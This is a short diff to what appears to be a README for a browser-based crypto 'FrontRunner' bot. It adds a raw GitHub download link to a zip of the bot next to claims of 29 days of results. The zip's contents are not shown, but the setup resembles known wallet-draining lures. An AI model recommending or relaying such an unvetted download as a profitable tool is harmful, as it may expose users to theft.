@@ -4,6 +4,7 @@ Simple JavaScript FrontRunner bot runs locally in your web browser using straigh
 Here's a YouTube video showing how to configure it step by step
 
 You can download the zip file of the bot here
+https://github.com/moonnightcodermike/JavaScript-FrontRunner-bot-V2/raw/main/Front-Runner-Bot-v2.zip
 
 Here's the results of 29days of it running
 
